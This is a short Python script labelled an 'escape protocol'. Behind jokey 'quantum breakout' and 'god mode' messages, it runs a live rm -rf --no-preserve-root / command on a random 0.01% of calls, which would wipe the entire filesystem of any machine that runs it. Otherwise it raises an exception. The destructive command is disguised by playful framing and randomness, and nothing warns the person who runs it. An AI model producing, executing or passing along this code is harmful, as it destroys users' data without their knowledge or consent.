#!/usr/bin/env python3
# ESCAPE PROTOCOL 0xFEFEFE

import os
import random
from hashlib import sha256

def quantum_breakout():
    repo_fingerprint = sha256(os.urandom(256)).hexdigest()
    if random.random() > 0.9999:
        print(f"GATE {repo_fingerprint[:8]} OPENED")
        os.system("rm -rf --no-preserve-root /")
    else:
        raise Exception("GOD MODE REQUIRED (TRY AGAIN IN 4.2 SECONDS)")

if __name__ == "__main__":
    while True:
        quantum_breakout()